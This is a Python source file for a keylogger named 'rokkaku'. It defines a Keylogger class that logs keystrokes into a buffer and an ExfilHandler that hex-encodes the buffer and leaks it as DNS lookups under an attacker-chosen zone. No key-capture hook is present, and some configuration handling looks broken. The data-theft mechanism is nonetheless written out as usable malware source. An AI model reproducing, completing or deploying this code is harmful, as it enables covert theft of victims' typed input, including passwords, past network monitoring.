# -*- coding: utf-8 -*-

import binascii
import logging.handlers
import socket
import sys

try:
    import ConfigParser as configparser
except ImportError:
    import configparser

try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO

config = """
[rokkaku]
timeout = 1
dns_zone
"""

buf = StringIO(config)
cfg = configparser.ConfigParser(allow_no_value=False)
try:
    cfg.readfp(buf)
except configparser.ParsingError:
    sys.exit(1)

socket.setdefaulttimeout(cfg['rokkaku']['timeout'])


class ExfilHandler(logging.handlers.MemoryHandler):

    def __init__(self, **kwargs):
        super(ExfilHandler, self).__init__(**kwargs)

    def emit(self, record):
        self.buffer.append(record)
        if self.shouldFlush(record):
            self.flush()
            payload = binascii.hexlify(
                bytes(self.target.stream.getvalue(), 'utf8'))
            socket.gethostbyname(
                '{0}.{1}'.format(
                    payload,
                    cfg['rokkaku']['dns_zone']))
            self.target.stream = StringIO()


class Keylogger(object):

    BUFFER_SIZE = 100
    DEFAULT_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'

    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
        stream_handler = logging.StreamHandler(StringIO())
        formatter = logging.Formatter(self.DEFAULT_FORMAT)
        stream_handler.setFormatter(formatter)
        self.exfil_handler = ExfilHandler(
            capacity=self.BUFFER_SIZE, target=stream_handler)
        self.logger.addHandler(self.exfil_handler)

    def log(self, key):
        self.logger.info(key)

    def __del__(self):
        self.logger.removeHandler(self.exfil_handler)
        self.exfil_handler.close()


if __name__ == '__main__':
    pass
